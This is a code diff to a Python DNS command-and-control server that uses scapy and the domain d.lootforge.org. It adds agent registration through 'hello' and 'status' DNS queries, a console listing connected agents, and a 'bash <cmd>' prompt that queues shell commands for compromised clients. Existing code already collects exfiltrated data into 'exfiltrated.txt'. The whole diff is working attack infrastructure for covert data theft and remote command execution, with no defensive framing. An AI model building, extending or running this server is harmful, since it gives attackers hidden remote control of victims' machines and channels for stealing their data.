@@ -28,6 +28,7 @@ import datetime
 import socket
 import sys
 import threading
+import time
 
 from scapy.all import IP, UDP, DNS, DNSQR, DNSRR, send, sniff, conf
 from scapy.layers.dns import DNSRRSOA
@@ -36,7 +37,7 @@ from scapy.packet import NoPayload
 # ---------------------------------------------------------------------------
 # Configuration
 # ---------------------------------------------------------------------------
-VERSION     = "v2.0"
+VERSION     = "v3.0"
 DOMAIN      = "d.lootforge.org"
 NS_HOST     = "cwmkeg.lootforge.org"   # must match the NS glue record in lootforge.org
 OUTPUT_FILE = "exfiltrated.txt"
@@ -52,6 +53,10 @@ _state        = {"command": "NONE"}
 
 _session_lock = threading.Lock()
 _sessions     = {}                        # sid -> {"chunks": {idx: str}, "total": int}
+
+# Agent registry — populated by hello.<agent_id>.<domain> handshake queries.
+_agents_lock  = threading.Lock()
+_agents       = {}                        # agent_id -> {"first_seen": float, "last_seen": float, "ip": str}
 
 
 # ---------------------------------------------------------------------------
@@ -280,6 +285,36 @@ def _dns_handler(pkt) -> None:
         send(_make_txt_response(pkt, txt_payload), verbose=0)
         return
 
+    # --- Handshake: hello.<agent_id> — register agent, return a dummy A record ---
+    if len(sub_labels) == 2 and sub_labels[0] == "hello":
+        agent_id = sub_labels[1]
+        now = time.time()
+        with _agents_lock:
+            if agent_id not in _agents:
+                _agents[agent_id] = {"first_seen": now, "last_seen": now, "ip": src_ip}
+                _notify(
+                    f"  NEW AGENT REGISTERED\n"
+                    f"  ID   : {agent_id}\n"
+                    f"  IP   : {src_ip}\n"
+                    f"  Time : {datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')}"
+                )
+            else:
+                _agents[agent_id]["last_seen"] = now
+                _agents[agent_id]["ip"] = src_ip
+                print(f"[HB]  Agent {agent_id} heartbeat from {src_ip}")
+        send(_make_a_response(pkt), verbose=0)
+        return
+
+    # --- Handshake: status.<agent_id> — TXT "ACK" if agent is registered ---
+    if len(sub_labels) == 2 and sub_labels[0] == "status":
+        agent_id = sub_labels[1]
+        with _agents_lock:
+            known = agent_id in _agents
+        txt_payload = b"ACK" if known else b"NONE"
+        print(f"[HS]  Status query agent={agent_id} → {txt_payload.decode()}")
+        send(_make_txt_response(pkt, txt_payload), verbose=0)
+        return
+
     # --- Data exfiltration query ---
     if _handle_data_query(sub_labels, src_ip):
         send(_make_a_response(pkt), verbose=0)
@@ -296,8 +331,9 @@ def _dns_handler(pkt) -> None:
 
 def _console_loop() -> None:
     print("\n[*] Operator console ready.")
-    print("    Type a command to queue it for the next client poll.")
-    print("    Type 'clear' to remove any pending command.\n")
+    print("    Queue a shell command  : bash <cmd>   (e.g.  bash whoami)")
+    print("    Clear pending command  : clear")
+    print("    List connected agents  : agents\n")
 
     while True:
         try:
@@ -313,6 +349,17 @@ def _console_loop() -> None:
             with _state_lock:
                 _state["command"] = "NONE"
             print("[*] Command cleared — clients will receive NONE.")
+        elif line.lower() in ("agents", "list"):
+            with _agents_lock:
+                if not _agents:
+                    print("[*] No agents registered yet.")
+                else:
+                    print(f"[*] {len(_agents)} registered agent(s):")
+                    now = time.time()
+                    for aid, info in sorted(_agents.items(), key=lambda x: x[1]["last_seen"], reverse=True):
+                        age = int(now - info["last_seen"])
+                        first = datetime.datetime.fromtimestamp(info["first_seen"]).strftime("%H:%M:%S")
+                        print(f"    {aid:<12s}  ip={info['ip']:<16s}  first={first}  last_seen={age}s ago")
         else:
             with _state_lock:
                 _state["command"] = line
